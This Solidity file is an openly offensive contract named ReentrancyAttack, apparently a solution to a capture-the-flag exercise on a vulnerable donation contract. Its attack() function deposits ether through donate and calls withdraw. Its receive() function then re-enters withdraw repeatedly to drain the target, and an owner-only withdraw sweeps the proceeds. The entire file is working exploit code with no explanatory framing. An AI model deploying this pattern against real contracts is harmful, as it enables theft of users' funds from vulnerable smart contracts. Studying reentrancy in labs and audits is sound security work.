// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

contract ReentrancyAttack {
    address target;
    address owner;

    constructor(address _target) public payable {
        target = _target;
        owner = msg.sender;
    }

    function attack() external payable {
        uint256 value = address(this).balance;

        (bool success, ) = target.call{value: value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success, "call failed");

        (bool success2, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", value));
        require(success2, "call 2 failed");
    }

    receive() external payable {
        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success, "call failed");

        uint256 balance = abi.decode(data, (uint256));
        uint256 fundsLeft = payable(target).balance;
        uint256 toWithdraw = (fundsLeft - balance) > 0 ? balance : fundsLeft;

        if (toWithdraw > 0) {
            (bool success2, ) = target.call(
                abi.encodeWithSignature("withdraw(uint256)", toWithdraw)
            );
            require(success2);
        }
    }

    function withdraw() external {
        require(msg.sender == owner);

        payable(msg.sender).transfer(address(this).balance);
    }
}
